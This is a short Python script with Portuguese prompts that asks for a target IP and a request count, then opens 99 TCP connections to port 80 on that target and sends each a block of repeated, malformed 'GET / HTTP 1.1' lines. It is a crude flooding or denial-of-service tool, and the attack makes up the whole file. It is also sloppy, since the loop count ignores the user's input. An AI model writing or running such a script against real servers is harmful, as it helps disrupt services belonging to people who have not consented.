import socket

qntd = int(input("Digite a quantidade de Requests: "))
target = input("Digite o IP desejado: ")

print(target, ' - REQUEST - ', qntd, 'x')

for i in range(1,100):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,80))
    data = b"GET / HTTP 1.1\r\n"*qntd
    s.send(data)
    s.close()
